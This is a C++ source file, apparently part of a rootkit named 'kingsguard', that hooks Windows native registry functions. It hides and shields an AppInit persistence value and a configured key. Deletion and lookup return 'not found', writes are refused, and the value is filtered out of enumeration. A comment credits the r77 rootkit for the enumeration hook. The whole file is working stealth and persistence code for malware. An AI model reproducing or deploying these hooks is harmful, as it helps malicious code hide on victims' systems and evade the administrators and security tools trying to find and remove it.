#include "kingsguard.h"

NTSTATUS WINAPI HookedNtDeleteValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName)
{
    if (ValueName->Length > 3)
    {
        std::wstring w_name = std::wstring(ValueName->Buffer);
        if (CheckExistsW(w_name, APPINIT, false) || CheckExistsW(w_name, KEY, false))
            return STATUS_OBJECT_NAME_NOT_FOUND;
    }

    return OriginalNtDeleteValueKey(KeyHandle, ValueName);
}

NTSTATUS WINAPI HookedNtSetValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName, ULONG TitleIndex, ULONG Type, PVOID Data, ULONG DataSize)
{
    if (ValueName->Length > 3)
    {
        std::wstring w_name = std::wstring(ValueName->Buffer);
        if (CheckExistsW(w_name, APPINIT, false) || CheckExistsW(w_name, KEY, false)) 
            return STATUS_ACCESS_DENIED;
    }

    return OriginalNtSetValueKey(KeyHandle, ValueName, TitleIndex, Type, Data, DataSize);
}

NTSTATUS WINAPI HookedNtQueryValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName, NT_KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength)
{
    if (ValueName->Length > 3)
    {
        std::wstring w_name = std::wstring(ValueName->Buffer);
        if (CheckExistsW(w_name, APPINIT, false) || CheckExistsW(w_name, KEY, false))
            return STATUS_OBJECT_NAME_NOT_FOUND;
    }
    return OriginalNtQueryValueKey(KeyHandle, ValueName, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);
}

// pulled from r77 rootkit - ty
NTSTATUS WINAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_VALUE_INFORMATION_CLASS keyValueInformationClass, LPVOID keyValueInformation, ULONG keyValueInformationLength, PULONG resultLength)
{
    NTSTATUS status = OriginalNtEnumerateValueKey(key, index, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);

    if (status == ERROR_SUCCESS && (keyValueInformationClass == KeyValueBasicInformation || keyValueInformationClass == KeyValueFullInformation))
    {
        for (ULONG i = 0, newIndex = 0; newIndex <= index && status == ERROR_SUCCESS; i++)
        {
            status = OriginalNtEnumerateValueKey(key, i, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);

            std::wstring w_name = std::wstring(KeyValueInformationGetName(keyValueInformation, keyValueInformationClass));
            if (CheckExistsW(w_name, APPINIT, true) && CheckExistsW(w_name, KEY, true))
                newIndex++;
        }
    }

    return status;
}